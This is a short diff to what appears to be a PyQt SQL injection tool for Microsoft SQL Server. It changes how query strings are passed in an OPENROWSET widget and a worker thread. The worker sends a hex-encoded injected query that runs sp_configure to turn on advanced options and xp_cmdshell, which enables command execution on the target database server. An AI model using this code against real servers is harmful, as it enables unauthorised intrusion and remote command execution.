@@ -34,7 +34,7 @@ class OpenrowsetWidget(QtGui.QWidget):
         self.ui.setupUi(self)
         self.setWindowModality(QtCore.Qt.ApplicationModal)
         self.vars = vars
-        self.qstring = core.txtproc.correctQstr(qstring)
+        self.qstring = qstring
         self.ui.progressBar.hide()
         self.ui.openrowsetGroup.setEnabled(False)
         
@@ -309,7 +309,7 @@ class Worker(QtCore.QThread):
         #Enbale xp_cmdshell request
         hex = core.txtproc.strToHex(\
         "sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure", True)
-        query =  self.wq.buildQuery(core.txtproc.correctQstr(self.qstrings['mssql_error_based']['exec_hex']), self.vars, {'hex' : hex})
+        query =  self.wq.buildQuery(self.qstring, self.vars, {'hex' : hex})
         self.wq.httpRequest(query, True, self.vars)
 
         #Enbale openrowset request
